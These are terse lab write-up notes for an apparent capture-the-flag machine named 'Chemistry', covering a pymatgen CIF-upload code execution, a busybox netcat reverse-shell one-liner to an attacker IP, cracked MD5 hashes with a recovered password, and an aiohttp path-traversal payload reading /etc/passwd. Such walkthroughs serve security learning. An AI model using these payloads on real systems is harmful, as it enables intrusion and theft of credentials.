  
![](assets/Chemistry/Screenshot_from_2024-10-21_16-10-19.png)
Server: Werkzeug/3.0.3 Python/3.9.5
  
Directory and subdomain search gave nothing
![image 80.png](assets/Chemistry/image%2080.png)
  
register for an account to see the file upload page
- they use CIF files
![image 1 47.png](assets/Chemistry/image%201%2047.png)
[https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)
change the os system call to a ping and check to see if RCE is working with tcp dump
![image 2 47.png](assets/Chemistry/image%202%2047.png)
  
  
[https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)
- change the code “touch pwned” to a one liner (below)
[https://www.revshells.com/](https://www.revshells.com/)
- use busybox
busybox nc 10.10.14.28 8877 -e sh
![image 3 41.png](assets/Chemistry/image%203%2041.png)
  
password in app.py
![image 4 37.png](assets/Chemistry/image%204%2037.png)
  
password in /app/instance/database.db
![image 5 36.png](assets/Chemistry/image%205%2036.png)
- every user has M<user><hash> format
    
    - find rosa and crack her hash (MD5)
    
    - rosa is a user with a folder on the computer (most likely has ssh)
    
  
![image 6 32.png](assets/Chemistry/image%206%2032.png)
rosa:unicorniosrosados
  
![image 7 31.png](assets/Chemistry/image%207%2031.png)
  
![image 8 28.png](assets/Chemistry/image%208%2028.png)
darn
  
sudo version
![image 9 28.png](assets/Chemistry/image%209%2028.png)
  
![image 10 23.png](assets/Chemistry/image%2010%2023.png)
vulnerable to CVE-2021-3560 (no it’s not)
  
![image 11 22.png](assets/Chemistry/image%2011%2022.png)
8080 and 53 are active
- probably gonna be 8080
  
site monitoring on port 8080
![image 12 16.png](assets/Chemistry/image%2012%2016.png)
  
nothing from ffuf
![image 13 16.png](assets/Chemistry/image%2013%2016.png)
- assets could be useful
  
whatweb shows aiohttp version 3.9.1
![image 14 15.png](assets/Chemistry/image%2014%2015.png)
  
directory traversal for aio 3.9.1 (forgot the CVE #)
- instead of /static/../../../../etc/passwd do /assets/../../../../etc/passwd